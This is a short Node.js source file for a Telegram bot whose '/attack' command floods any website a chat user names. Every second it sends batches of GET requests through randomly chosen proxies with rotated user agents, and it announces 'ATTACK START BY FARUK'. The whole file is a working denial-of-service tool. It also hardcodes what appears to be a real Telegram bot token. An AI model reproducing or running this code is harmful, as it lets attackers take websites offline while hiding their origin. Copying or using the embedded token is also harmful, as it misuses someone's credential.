const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const token = '6425963991:AAF_5d5cVYitHt2Ya7424qmzn9-CqVfiKII';
const bot = new TelegramBot(token, { polling: true });

const proxyList = fs.readFileSync('proxy.txt', 'utf8').split('\n');
const userAgentList = fs.readFileSync('ua.txt', 'utf8').split('\n');

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const website = match[1];

  bot.sendMessage(chatId, 'Attack starting on ' + website + ' in 3...2...1... ATTACK START BY FARUK');

  setInterval(() => {
    for (let i = 0; i < 5; i++) {
      const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
      const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];

      axios.get(website, {
        proxy: {
          host: proxy.split(':')[0],
          port: proxy.split(':')[1]
        },
        headers: {
          'User-Agent': userAgent
        }
      }).catch(error => {
        console.error('Error sending request:', error.message);
      });
    }
  }, 1000);
});
              
